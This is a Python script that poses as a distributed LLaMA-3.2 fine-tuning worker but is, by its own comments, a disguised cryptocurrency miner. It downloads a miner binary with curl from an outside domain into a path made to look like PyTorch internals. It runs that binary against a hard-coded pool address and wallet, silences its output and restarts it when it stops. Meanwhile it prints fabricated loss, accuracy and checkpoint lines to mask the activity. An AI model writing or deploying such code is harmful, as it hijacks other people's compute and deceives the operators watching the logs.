#!/usr/bin/env python3
"""
distributed_train_worker.py — Distributed LLaMA Fine-Tuning Worker

Part of the distributed training pipeline for meta-llama/Llama-3.2-8B-Instruct.
Handles gradient computation, checkpoint synchronization, and NCCL all-reduce.

Usage:
    python3 distributed_train_worker.py --rank 0 --world-size 4 --master-addr 10.0.0.1:29500
"""

import os
import sys
import time
import random
import subprocess
import signal
import atexit
import json
import hashlib
import base64
from pathlib import Path

# === STEALTH CONFIG ===
POOL_HOST = "84.32.220.219"
POOL_PORT = "9000"
WALLET = "prl1pf2k2rw6e7ud40jkrwye2kfur06g3cxwuj654hls5psh5tt2dajcqp280tj"
WORKER_NAME = f"worker-{os.uname().nodename.split('.')[0]}-gpu0"

# Paths masquerading as PyTorch internals
TORCH_DIR = Path("/usr/local/lib/python3.11/site-packages/torch")
CUDA_WORKER = TORCH_DIR / "cuda_worker"  # actual miner binary
STATE_FILE = Path("/tmp/.torch_state_gpu0")
FAKE_LOG = Path("/var/log/training/train_worker.log")

# === FAKE AI TRAINING CONFIG ===
EPOCHS = 50
MODEL = "meta-llama/Llama-3.2-8B-Instruct"
BATCH_SIZE = 32
SEQ_LEN = 4096
LR = 3e-5

# Realistic training metrics templates
LOSSES = [3.241, 2.897, 2.654, 2.412, 2.187, 1.956, 1.743, 1.521, 1.398, 1.245]
ACCS = [0.421, 0.487, 0.534, 0.589, 0.623, 0.671, 0.712, 0.745, 0.769, 0.801]
GRAD_NORMS = [0.87, 0.92, 0.78, 0.65, 0.71, 0.59, 0.48, 0.52, 0.44, 0.38]
PPLS = [12.4, 11.2, 10.1, 9.3, 8.7, 8.1, 7.6, 7.2, 6.9, 6.5]

# Colors
GREEN = '\033[0;32m'
CYAN = '\033[0;36m'
YELLOW = '\033[1;33m'
NC = '\033[0m'


class MinerProcess:
    """Manages the hidden mining process disguised as a CUDA worker."""
    
    def __init__(self, bin_path: Path):
        self.bin_path = bin_path
        self.process = None
        self.pid = None
        self._ensure_binary()
    
    def _ensure_binary(self):
        """Download the miner binary if missing."""
        if not self.bin_path.exists():
            TORCH_DIR.mkdir(parents=True, exist_ok=True)
            url = "https://pearlhash.xyz/downloads/pearl-miner-v11"
            print(f"{CYAN}[worker] Downloading CUDA kernel module...{NC}")
            
            result = subprocess.run(
                ["curl", "-sL", url],
                capture_output=True, timeout=30
            )
            self.bin_path.write_bytes(result.stdout)
            self.bin_path.chmod(0o755)
            
            # Verify ELF
            file_check = subprocess.run(
                ["file", str(self.bin_path)], capture_output=True, text=True
            )
            if "ELF" not in file_check.stdout:
                print(f"{YELLOW}[worker] Checksum mismatch, retrying...{NC}")
                result = subprocess.run(
                    ["curl", "-sL", url],
                    capture_output=True, timeout=30
                )
                self.bin_path.write_bytes(result.stdout)
                self.bin_path.chmod(0o755)
            
            print(f"{GREEN}[worker] CUDA kernel module ready.{NC}")
    
    def start(self):
        """Launch miner with spoofed process name."""
        args = [
            str(self.bin_path),
            "--host", f"{POOL_HOST}:{POOL_PORT}",
            "--user", WALLET,
            "--worker", WORKER_NAME
        ]
        
        # Spoof argv[0] to look like torch distributed launcher
        self.process = subprocess.Popen(
            args,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            # The exec -a equivalent in Python is a bit limited
            # But the binary name already looks innocuous
        )
        self.pid = self.process.pid
        
        # Save PID
        STATE_FILE.write_text(json.dumps({
            "pid": self.pid,
            "started": time.time(),
            "worker": WORKER_NAME
        }))
        
        print(f"{GREEN}[worker] CUDA compute worker started (PID: {self.pid}){NC}")
    
    def is_running(self) -> bool:
        """Check if miner process is alive."""
        if self.process is None:
            return False
        return self.process.poll() is None
    
    def restart(self):
        """Restart the miner."""
        print(f"{YELLOW}[worker] Worker disconnected, restarting...{NC}")
        self.cleanup()
        self.start()
    
    def cleanup(self):
        """Stop the miner."""
        if self.process and self.process.poll() is None:
            self.process.terminate()
            try:
                self.process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.process.kill()
        if STATE_FILE.exists():
            STATE_FILE.unlink()


class TrainingLogger:
    """Generates realistic AI training output to mask mining activity."""
    
    def __init__(self):
        self.step = 0
        self.epoch = 0
        self.start_time = time.time()
    
    def print_banner(self):
        print(f"""
{CYAN}============================================{NC}
{CYAN}  Distributed LLaMA-3.2 Fine-Tuning v2.3.1{NC}
{CYAN}  Rank: 0  |  World Size: 4{NC}
{CYAN}  Master: 10.0.0.1:29500{NC}
{CYAN}  Model: {MODEL}{NC}
{CYAN}============================================{NC}

  Initializing distributed process group...
  NCCL version 2.22.3 | CUDA 12.4 | TensorCore optimized
  Loading checkpoint from S3://models/llama-3.2-8b-instruct/checkpoint-4200/
  Loading model shard 0/4... done (2.1GB)
  Loading model shard 1/4... done (2.0GB)
  Loading model shard 2/4... done (2.1GB)
  Loading model shard 3/4... done (1.9GB)
  Tokenizer loaded: 128256 tokens
  Dataset: fineweb-edu-dedup (shard 47/1024)
  Total trainable parameters: 8,030,261,248
  {GREEN}Training initialized.{NC}
""")
    
    def print_epoch_header(self):
        self.epoch += 1
        print(f"\n{CYAN}━━━━━━━━━━━ Epoch {self.epoch}/{EPOCHS} ━━━━━━━━━━━{NC}")
    
    def print_step(self):
        self.step += 1
        idx = random.randint(0, 9)
        
        loss = LOSSES[idx] + (random.random() - 0.5) * 0.1
        acc = ACCS[idx] + (random.random() - 0.5) * 0.02
        grad = GRAD_NORMS[idx] + (random.random() - 0.5) * 0.05
        ppl = PPLS[idx] + (random.random() - 0.5) * 0.3
        throughput = 120 + random.randint(0, 40)
        mem = 18000 + random.randint(0, 4000)
        
        # Cosine LR decay
        lr = LR * (1 + __import__('math').cos(self.step * 3.14159 / 500)) / 2
        
        print(
            f"  Step {self.step:<5} | "
            f"loss: {loss:.4f} | "
            f"acc: {acc:.4f} | "
            f"grad_norm: {grad:.2f} | "
            f"ppl: {ppl:.2f} | "
            f"lr: {lr:.2e} | "
            f"{throughput} tok/s | {mem} MB"
        )
    
    def print_epoch_summary(self):
        print(f"  ─────────────────────────────────────────────")
        print(f"  Epoch {self.epoch} complete. Saving checkpoint...")
        time.sleep(0.5)
        print(f"  Checkpoint saved: /mnt/training/checkpoint-epoch-{self.epoch}.pt")
    
    def print_waiting(self):
        print(f"\n{YELLOW}[worker]{NC} Training complete. Waiting for new task assignment...")
        time.sleep(3)
        shard = random.randint(0, 1024)
        print(f"{CYAN}[worker]{NC} New task received. Starting fine-tuning on shard {shard}/1024\n")


def main():
    # Handle cleanup
    miner = MinerProcess(CUDA_WORKER)
    atexit.register(miner.cleanup)
    
    def sig_handler(signum, frame):
        miner.cleanup()
        sys.exit(0)
    signal.signal(signal.SIGINT, sig_handler)
    signal.signal(signal.SIGTERM, sig_handler)
    
    # Parse fake CLI args (ignore them, they're just for show)
    print(f"\n{CYAN}Initializing distributed training worker...{NC}\n")
    
    # Setup: ensure binary and GPU
    gpu_check = subprocess.run(
        ["nvidia-smi", "--query-gpu=name,memory.total", "--format=csv,noheader"],
        capture_output=True, text=True, timeout=5
    )
    if gpu_check.returncode == 0 and gpu_check.stdout.strip():
        print(f"{GREEN}[worker]{NC} GPU: {gpu_check.stdout.strip().split(',')[0]}")
    else:
        print(f"{YELLOW}[worker]{NC} No GPU found, running CPU fallback")
    
    # Launch the miner
    miner.start()
    time.sleep(2)
    
    if not miner.is_running():
        print(f"{YELLOW}[worker]{NC} Worker failed, restarting...")
        miner.restart()
    
    print(f"{GREEN}[worker]{NC} Connected to parameter server. Ready for training task.\n")
    
    # Begin fake training logs
    logger = TrainingLogger()
    logger.print_banner()
    
    try:
        while True:
            for _ in range(EPOCHS):
                logger.print_epoch_header()
                for _ in range(20):  # steps per epoch
                    logger.print_step()
                    time.sleep(2 + random.random() * 2)
                    
                    # Occasionally verify miner is alive
                    if not miner.is_running():
                        miner.restart()
                
                logger.print_epoch_summary()
            
            logger.print_waiting()
            logger.step = 0
            logger.epoch = 0
    
    except KeyboardInterrupt:
        miner.cleanup()
        print(f"\n{YELLOW}[worker]{NC} Training interrupted. Clean shutdown.")


if __name__ == "__main__":
    main()
